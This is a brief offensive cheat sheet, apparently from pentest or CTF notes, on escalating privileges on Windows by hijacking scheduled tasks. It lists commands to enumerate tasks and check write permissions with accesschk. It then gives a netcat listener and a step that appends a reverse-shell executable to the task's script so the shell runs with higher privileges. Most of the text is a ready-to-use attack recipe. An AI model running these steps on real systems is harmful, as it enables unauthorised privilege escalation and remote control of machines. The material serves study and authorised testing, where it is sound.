- - -
**Cronjobs**.
Unfortunately, there is no easy method for enumerating custom tasks that belongs to
other users as a low priviledged user account.


### Start :
List all scheduled tasks that our user can see.

```powershell
schtasks /query /fo LIST /v
```

### In Powershell :

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

But don't rely completely on these above command, Noticing your target system manualy is Brutal.

Now If you find a cron.

**<u>Do we have write permissions in the existing binary path</u>**. 
Note at your GROUP in the results.

```powershell
 .\accesschk.exe /accepteula -qvu <our_user> "C:\path To\Cronjob"
```

```sh
nc -nvlp 9090
```

Have a backup of the original one.

```powershell
copy cronjob.ps1 C:\Temp\
```

Transfer your reverse shell.

Then run.

```powershell
echo C:\Path\To\reverse.exe >> cronjob.ps1
```

All set just Wait now !!!
<br>

- - -
